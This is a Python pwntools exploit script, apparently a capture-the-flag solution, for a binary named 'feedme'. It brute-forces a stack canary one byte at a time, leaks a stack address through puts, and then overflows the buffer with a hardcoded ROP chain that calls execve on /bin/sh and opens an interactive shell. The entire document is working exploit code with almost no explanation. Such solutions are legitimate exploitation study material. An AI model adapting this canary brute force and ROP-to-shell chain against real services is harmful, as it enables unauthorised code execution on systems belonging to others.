from pwn import *

p = process("./feedme")
#p = gdb.debug("./feedme", "break *0x08049069\nset follow-fork-mode parent\nc")

cookie_0 = 0
cookie_1 = 0
cookie_2 = 0
cookie_3 = 0


count = 0
# brute force first byte of cookie
for i in xrange(0, 0xff):
    count += 1
    if (i % 0x10 == 0):
        print "progress:", hex(i), "/", hex(0xff)

    p.recvuntil("FEED ME!")
    p.send("\x21")
    p.send("A" * 0x20 + chr(i))
    
    buf = p.recvuntil("Child exit.")
    if "stack smashing detected" in buf:
        continue
    else:
        cookie_0 = chr(i)
        print "cookie 0:", hex(ord(cookie_0))
        break

# brute force second byte of cookie
for i in xrange(0, 0xff):
    count += 1
    if(i % 0x10 == 0):
        print "progress:", hex(i), "/", hex(0xff)
    p.recvuntil("FEED ME!")
    p.send("\x22")
    p.send("A" * 0x20 + cookie_0 + chr(i))
    
    buf = p.recvuntil("Child exit.")
    if "stack smashing detected" in buf:
        continue
    else:
        cookie_1 = chr(i)
        print "cookie 1:", hex(ord(cookie_1))
        break

# brute force third byte of cookie
for i in xrange(0, 0xff):
    count += 1
    if(i % 0x10 == 0):
        print "progress:", hex(i), "/", hex(0xff)
    p.recvuntil("FEED ME!")
    p.send("\x23")
    p.send("A" * 0x20 + cookie_0 + cookie_1 + chr(i))
    
    buf = p.recvuntil("Child exit.")
    if "stack smashing detected" in buf:
        continue
    else:
        cookie_2 = chr(i)
        print "cookie 2:", hex(ord(cookie_2))
        break

# brute force fourth byte of cookie
for i in xrange(0, 0xff):
    count += 1
    if(i % 0x10 == 0):
        print "progress:", hex(i), "/", hex(0xff)
    p.recvuntil("FEED ME!")
    p.send("\x24")
    p.send("A" * 0x20 + cookie_0 + cookie_1 + cookie_2 + chr(i))
    
    buf = p.recvuntil("Child exit.")
    if "stack smashing detected" in buf:
        continue
    else:
        cookie_3 = chr(i)
        print "cookie 3:", hex(ord(cookie_3))
        break


final_cookie = cookie_0 + cookie_1 + cookie_2 + cookie_3

print "final cookie:", hex(u32(final_cookie))
print "count:",count


puts_loc = p32(0x0804FC60)
stack_leak_loc = p32(0x80eb54c)

print p.recvuntil("FEED ME!")

# do a stach leak, using puts.
p.send("\x80")
p.send("A"*0x20 + final_cookie + "A"*12 + puts_loc + stack_leak_loc * 2 + "B"*(0x80 - 0x20 - 12 - 12 - 4))

data = p.recvuntil("FEED ME")

# parse out stack leak
stack_leak = data.split("...\n")[1][0:4]
stack_leak = u32(stack_leak)

print "stack leak: 0x" + hex(stack_leak)
buf_loc = stack_leak - 272
print "buf_loc:", hex(buf_loc)

xor_eax_eax = p32(0x08054a10)
int_80 = p32(0x08049761)
set_eax = p32(0x0808edb2)
pop_ebx = p32(0x080481c9)
inc_ecx = p32(0x080da88c)
sh_addr = p32(0x080C267D)

# overflow with rop chain
rop_chain = xor_eax_eax + set_eax + "BBBB" + pop_ebx + p32(buf_loc + 8) + inc_ecx + int_80

p.send("\x01")
p.send("A")

# pause for me to manually attach my debugger
p.recvuntil("FEED ME")
p.send("\x80")
p.send("/"*(0x20-7) + "bin/sh\x00" + final_cookie + "A"*12 + rop_chain + "B"*(0x80 - 0x20 - 4 - 12 - len(rop_chain)))
p.interactive()
